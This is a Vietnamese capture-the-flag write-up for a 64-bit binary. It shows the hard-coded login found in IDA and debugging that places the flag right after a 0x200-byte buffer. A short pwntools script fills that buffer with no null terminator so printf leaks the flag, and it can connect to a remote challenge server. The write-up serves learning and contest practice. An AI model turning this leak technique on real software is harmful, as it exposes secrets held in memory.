Giờ ta sẽ nhìn sơ qua file binary được cung cấp và các chế độ bảo vệ


![image](https://user-images.githubusercontent.com/114044703/213348890-bc9b12fb-91c8-4bb0-aee4-7bbae89d76e3.png)

![image](https://user-images.githubusercontent.com/114044703/213348466-8d8d4f82-fb1a-4d92-aa7e-b4ae0890aaca.png)

Vậy chúng ta sẽ làm việc với file binary 64 bit. Khi chạy thì chương trình sẽ yêu cầu ta nhập tên và mật khẩu.

![image](https://user-images.githubusercontent.com/114044703/213349666-02ebd573-2600-4e0d-b681-887df95c549e.png)

![image](https://user-images.githubusercontent.com/114044703/213349827-83332f9b-af6e-43bb-9e94-976588f1d8c9.png)


Khi nhìn hàm main thông qua trình IDA thì ta thấy nếu username là "KCSC_4dm1n1str4t0r" và pass bằng với biến passwq hay là chuỗi "wh3r3_1s_th3_fl4g". Thì ta có thể nhập vào biến secrect 0x200 byte và in nó ra


Giờ ta sẽ debug chương trình và đặt breakpoint tại read secret. Sau đó kiểm tra xem trong 0x200 byte sắp ghi vô có gì đặc biệt không 

![image](https://user-images.githubusercontent.com/114044703/213351330-b72cf172-a8b5-4ee3-905d-191056005c5c.png)

Ở đây mình đã tạo flag là "BBBBBBBB" và dễ nhận thấy rằng sau secrect chính là flag. Vậy bài này ta cần thỏa mãn Username và password, sau đó lợi dụng cơ chế của printf bằng cách ghi 0x200 byte và để chèn byte null khiến cho printf in ra flag

Ta sẽ khai thác với những dữ liệu này:
```
from pwn import *
debug=1
if debug:
	t=process('./cat')
	#gdb.attach(t,api=True)
else:
	t=remote("159.89.197.210",9994)
t.sendafter(b"Username:",b"KCSC_4dm1n1str4t0r")
t.sendafter(b"Password:",b"wh3r3_1s_th3_fl4g")
t.sendafter(b"Your secret:",b"A"*0x200)
t.interactive()

```

Và sau khi chạy file(giờ đổi lại flag thành FLAG{} cho dễ nhìn :>):

![image](https://user-images.githubusercontent.com/114044703/213352196-794745c5-359b-4ea6-a3e0-f3fc51228325.png)

